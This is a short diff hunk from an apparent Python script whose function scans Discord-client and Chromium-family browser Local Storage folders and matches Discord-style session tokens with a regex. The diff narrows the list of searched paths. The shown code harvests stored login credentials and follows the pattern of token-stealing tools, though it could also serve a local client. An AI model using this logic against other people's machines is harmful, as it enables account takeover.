@@ -248,16 +248,12 @@ def scan_local_discord_session():
         os.path.join(user_home, ".config/discord/Local Storage/leveldb"),
         os.path.join(user_home, ".config/vesktop/sessionData/Local Storage/leveldb"),
         os.path.join(user_home, ".var/app/com.discordapp.Discord/config/discord/Local Storage/leveldb"),
-        os.path.join(user_home, ".config/EcosiaBrowser/*/Local Storage/leveldb"),
         os.path.join(user_home, ".config/chromium/*/Local Storage/leveldb"),
         os.path.join(user_home, ".config/BraveSoftware/Brave-Browser/*/Local Storage/leveldb"),
         os.path.join(user_home, ".config/google-chrome/*/Local Storage/leveldb"),
-        os.path.join(user_home, ".config/*/*/Local Storage/leveldb"),
-        os.path.expanduser("~/.config/EcosiaBrowser/*/Local Storage/leveldb"),
         os.path.expanduser("~/.config/discord/Local Storage/leveldb"),
         os.path.expanduser("~/.config/chromium/*/Local Storage/leveldb"),
         os.path.expanduser("~/.config/BraveSoftware/Brave-Browser/*/Local Storage/leveldb"),
-        os.path.expanduser("~/.config/*/*/Local Storage/leveldb"),
     ]
 
     jwt_re = re.compile(rb"([A-Za-z0-9_-]{20,32}\.[A-Za-z0-9_-]{6,8}\.[A-Za-z0-9_-]{25,55})")
